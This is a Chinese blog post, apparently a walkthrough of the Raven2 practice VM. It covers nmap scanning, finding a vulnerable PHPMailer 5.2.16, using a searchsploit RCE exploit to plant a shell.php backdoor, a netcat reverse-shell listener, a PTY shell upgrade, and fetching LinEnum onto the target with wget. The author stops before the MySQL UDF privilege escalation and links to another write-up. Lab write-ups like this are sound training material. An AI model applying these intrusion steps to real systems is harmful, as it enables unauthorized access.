---
title: raven2靶场
datas: 2024.6.27
tags:
  - 靶场
categories: 靶场
keywords:
description: raven2
---

# raven2靶场

## 信息收集
```
┌──(kali㉿kali)-[~]
└─$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255
        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)
        RX packets 5665  bytes 556139 (543.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7213  bytes 2015885 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0



┌──(kali㉿kali)-[~]
└─$ nmap -sS  192.168.159.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST
Nmap scan report for 192.168.159.1
Host is up (0.00037s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.159.2
Host is up (0.000084s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:50:56:E1:64:0A (VMware)

Nmap scan report for 192.168.159.132
Host is up (0.00028s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 00:0C:29:57:62:33 (VMware)

Nmap scan report for 192.168.159.254
Host is up (0.000054s latency).
All 1000 scanned ports on 192.168.159.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:FD:C9:B4 (VMware)

Nmap scan report for 192.168.159.129
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (5 hosts up) scanned in 12.00 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -sS -p- 192.168.159.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST
Nmap scan report for 192.168.159.132
Host is up (0.00080s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
60300/tcp open  unknown
MAC Address: 00:0C:29:57:62:33 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
```

访问192.168.169.132:80
就是一个简答的网站，扫描后台
![](https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f6c0.png)
有一个DS_STORE，还有vender

![](https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f58b.png)

在vender里面可以看到
![](https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f719.png)

逐个去看发现存在PHPMailer
![](https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f633.png)

并且在version

里面提示了版本号5.2.16


看到还有一个wordpress，访问了一下/wordpress


勉强能看？

既然是wordpress，我们就可以用wpscan扫描看看


没啥东西

不如试试PHPMailer

```
┌──(kali㉿kali)-[~]
└─$ searchsploit PHPMailer
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
PHPMailer 1.7 - 'Data()' Remote Denial of Service           | php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code Execution                  | php/webapps/40968.sh
PHPMailer < 5.2.18 - Remote Code Execution                  | php/webapps/40970.php
PHPMailer < 5.2.18 - Remote Code Execution                  | php/webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument Injection (Metasploi | multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code Execution                  | php/webapps/40969.py
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framewo | php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution    | php/webapps/42221.py
PHPMailer < 5.2.21 - Local File Disclosure                  | php/webapps/43056.py
WordPress Plugin PHPMailer 4.6 - Host Header Command Inject | php/remote/42024.rb
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
确实有，而且不少

下载 php/webapps/40974.py的python文件，并进行修改

![](https://pic.imgdb.cn/item/667d8214d9c307b7e91bb5ce.png)

其中的意思是在访问/content.php的时候建立一个shell.php的后门文件

打开地址网站，访问/contact.php，然后监听

```
nc -lvp 4444
```
进去以后先升级交互shell

```
 python -c 'import pty;pty.spawn("/bin/bash")';
```
使用LinEnum(Linux枚举及权限提升检查工具)
直接下载：
https://github.com/rebootuser/LinEnum
搭建http服务进行EXP文件传输：
python3 -m http.server 8000
进行下载：
wget http://192.168.3.2:8000/LinEnum-master/LinEnum.sh
加执行权限：
chmod +x LinEnum.sh
执行：
(可以查看到Mysql是用root登陆的)
![](https://pic.imgdb.cn/item/667d83a2d9c307b7e91ef6de.png)



```
find ./ -name "flag*"
```
能看到flag2和3

然后使用mysql的udf提权
后面的看一下大佬的吧，我没弄成，等我明天看看原理再说/ww

https://www.freebuf.com/articles/web/261047.html